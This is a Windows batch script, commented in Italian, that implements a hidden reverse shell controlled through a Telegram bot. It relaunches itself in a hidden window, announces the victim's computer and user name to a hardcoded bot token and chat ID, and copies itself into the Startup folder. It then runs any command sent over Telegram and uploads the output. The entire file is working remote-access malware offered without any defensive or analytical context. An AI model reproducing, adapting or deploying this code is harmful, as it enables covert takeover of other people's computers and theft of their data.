@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "LAST_UPDATE_ID=0"
set "OUTPUT_FILE=%TEMP%\cmd_output.txt"

:: Notifica di connessione
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🟢 Reverse Shell attiva su: %COMPUTERNAME% (%USERNAME%)"

:: Aggiungi all'avvio automatico
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\telegram_rsh.bat" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Loop principale
:command_loop
:: Recupera nuovi messaggi
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_UPDATE_ID%" > "%TEMP%\updates.json"

:: Estrai ultimo comando
for /f "delims=" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json' -Raw | ConvertFrom-Json; if($json.ok) { $update=$json.result[-1]; if($update.update_id -gt %LAST_UPDATE_ID%) { $LAST_UPDATE_ID=$update.update_id; if($update.message.text) { Write-Output ($update.update_id.ToString()+':'+$update.message.text) } } }"') do (
    set "update_data=%%A"
    set "LAST_UPDATE_ID=!update_data:*:=!"
    set "command=!update_data:*:=!"
    
    :: Ignora messaggi non comandi
    if "!command!" == "!command:cmd =!" goto command_loop
    
    :: Estrai comando dopo "cmd "
    set "cmd_to_execute=!command:*cmd =!"
    
    :: Esegui comando e salva output
    !cmd_to_execute! > "%OUTPUT_FILE%" 2>&1
    
    :: Invia output a Telegram
    curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument" ^
        -F "chat_id=%CHAT_ID%" ^
        -F "document=@%OUTPUT_FILE%" ^
        -F "caption=💻 %COMPUTERNAME%: !cmd_to_execute!"
    
    :: Pulisci
    del "%OUTPUT_FILE%" >nul 2>&1
)

:: Attesa 1 secondo
timeout /t 1 /nobreak >nul
goto command_loop
